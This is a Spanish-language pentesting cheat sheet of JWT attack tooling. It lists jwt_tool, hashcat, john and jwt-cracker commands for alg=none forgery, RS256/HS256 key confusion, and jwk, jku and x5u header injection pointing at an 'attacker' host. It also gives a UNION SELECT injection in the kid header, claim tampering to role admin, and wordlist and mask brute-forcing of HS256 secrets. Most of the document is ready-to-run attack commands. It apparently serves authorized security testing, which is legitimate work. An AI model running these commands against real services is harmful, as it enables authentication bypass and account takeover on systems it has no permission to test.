---
aliases:
  - jwt_tool
  - jwtcrack
  - JWT Hashcat
  - JWT Bruteforce Tools
tags:
  - type/tool
  - vuln/jwt
  - technique/credential-access
  - asset/web-app
  - cred/jwt
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[JWT Attacks]]'
  - '[[hashcat]]'
  - '[[john]]'
---
# JWT - Tooling y Brute Force

***

## jwt_tool (All-in-One)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && pip install -r requirements.txt` | Install jwt_tool | Primera vez. |
| `python3 jwt_tool.py $JWT` | Decode + heuristics warnings | Quick recon. |
| `python3 jwt_tool.py $JWT -T` | Tamper interactivo (modify claims + resign) | Manual exploration. |
| `python3 jwt_tool.py $JWT -M pb -t https://target/api -rh "Authorization: Bearer $JWT"` | Playbook automático completo | Bulk vuln scan. |
| `python3 jwt_tool.py $JWT -X a` | Auto-genera variantes alg=none | Test alg=none. |
| `python3 jwt_tool.py $JWT -X k -pk public.pem` | RS256 → HS256 confusion | Alg confusion attack. |
| `python3 jwt_tool.py $JWT -X i` | Auto-genera par + inyecta jwk en header | jwk header inject. |
| `python3 jwt_tool.py $JWT -X s -ju http://attacker/jwks.json -pk priv.pem` | Forge con jku malicioso | jku header inject. |
| `python3 jwt_tool.py $JWT -X s -ku http://attacker/cert.pem` | Forge con x5u malicioso | x5u header inject. |
| `python3 jwt_tool.py $JWT -I -hc kid -hv "x' UNION SELECT 'AAA' -- "` | kid SQLi inject | Backend usa kid en SQL. |
| `python3 jwt_tool.py $JWT -I -pc role -pv admin` | Modificar claim role + resign | Quick claim tamper. |
| `python3 jwt_tool.py $JWT -C -d /usr/share/wordlists/rockyou.txt` | Bruteforce HS256 secret | Quick crack check. |
| `python3 jwt_tool.py $JWT -S hs256 -p "weaksecret"` | Re-firmar con secret conocido | Post-crack regen. |
^jwt-tool-jwttool

### Flags clave (referencia)

| Flag | Función |
|---|---|
| `-T` | Tamper interactivo |
| `-M pb` | Modo playbook (probe completo) |
| `-X a/k/i/s` | Exploit auto: alg-none / alg-confusion / inject-jwk / inject-jku-x5u |
| `-I -hc <key> -hv <val>` | Modificar header claim |
| `-I -pc <key> -pv <val>` | Modificar payload claim |
| `-C -d <wordlist>` | Crack secret HMAC |
| `-S <alg> -p <secret>` | Re-firmar con alg + secret |
| `-pk <file>` | Privkey para RS256/ES256 |
| `-rh "Header: value"` | Headers extra para requests |

___

## Hashcat HS256

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `echo -n $JWT > jwt.txt && hashcat -m 16500 jwt.txt rockyou.txt` | GPU brute con wordlist | Quick check secret común. |
| `hashcat -m 16500 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule` | Wordlist + mutaciones | Cobertura ampliada. |
| `hashcat -m 16500 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule` | Rules más agresivas | Si best64 no resuelve. |
| `hashcat -m 16500 -a 3 jwt.txt ?l?l?l?l?l?l?l?l` | Mask 8 chars lowercase | Sin wordlist. |
| `hashcat -m 16500 -a 3 jwt.txt ?a?a?a?a?a?a` | Mask 6 chars charset full | Brute corto factible. |
| `hashcat -m 16500 -a 6 jwt.txt rockyou.txt ?d?d?d?d` | Hybrid wordlist + 4 dígitos sufijo | Common pattern. |
| `hashcat -m 16500 -a 1 jwt.txt list1.txt list2.txt` | Combinator de 2 wordlists | Compound passwords. |
| `hashcat -b -m 16500` | Benchmark velocidad GPU local | Pre-attack planning. |
| `hashcat -m 16500 jwt.txt --show` | Ver secret cracked previo | Resume / lookup. |
| `hashcat --restore` | Continuar sesión interrumpida | Long runs. |
^jwt-tool-hashcat

### Wordlists recomendadas

```bash
# JWT-specific (wallarm)
wget https://github.com/wallarm/jwt-secrets/raw/master/jwt.secrets.list

# Defaults dev comunes
cat <<EOF > defaults.txt
secret
secretkey
yoursecret
supersecret
jwt_secret
change_me
ChangeMe
default_secret
test
test123
EOF

# Combo
cat defaults.txt /usr/share/wordlists/rockyou.txt jwt.secrets.list | sort -u > combo.txt
hashcat -m 16500 jwt.txt combo.txt -r /usr/share/hashcat/rules/best64.rule
```

___

## jwtcrack y John the Ripper

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/lmammino/jwt-cracker && cd jwt-cracker && npm install` | Install jwtcrack (Node) | Charset corto brute. |
| `jwt-cracker -t $JWT -a abcdefghijklmnopqrstuvwxyz -m 6` | Brute charset specific, max length 6 | Secret corto sospechado. |
| `jwt-cracker -t $JWT -d wordlist.txt` | Dict mode | Sin GPU. |
| `john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt` | CPU brute con John | Sin GPU. |
| `john --wordlist=rockyou.txt --rules=Wordlist --format=HMAC-SHA256 jwt.txt` | Con reglas mutaciones | Cobertura. |
| `john --show --format=HMAC-SHA256 jwt.txt` | Ver resultado cracked | Post-run. |
| `docker run -v $PWD:/data lmammino/jwt-cracker -t $JWT -d /data/words.txt` | Sin instalar deps | Containerized. |
^jwt-tool-jwtcrack

### Comparación de tools (referencia)

| Tool | Velocidad | Uso recomendado |
|---|---|---|
| **hashcat** (-m 16500) | Más rápido (GPU) | Secrets >7 chars |
| **john** | CPU mid | Sin GPU disponible |
| **jwtcrack** | Lento (JS) | Charset chico (≤5 chars) |
| **jwt_tool -C** | Wrapper conveniente | Recon rápido + crack mode |

***
